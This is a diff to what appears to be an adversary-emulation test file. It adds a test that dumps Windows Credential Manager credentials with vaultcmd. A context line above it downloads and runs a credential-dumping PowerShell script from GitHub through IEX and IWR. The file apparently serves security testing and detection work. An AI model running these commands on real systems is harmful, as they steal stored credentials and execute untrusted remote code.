@@ -49,3 +49,12 @@ atomic_tests:
     elevation_required: false
     command: |
       IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
+- name: Dump credentials from Windows Credential Manager using vaultcmd.exe
+  description: This module will extract credentials stored in both vaults of Windows Credential Manager using builtin utility vaultcmd.exe
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      vaultcmd /listcreds:"Windows Credentials" /all
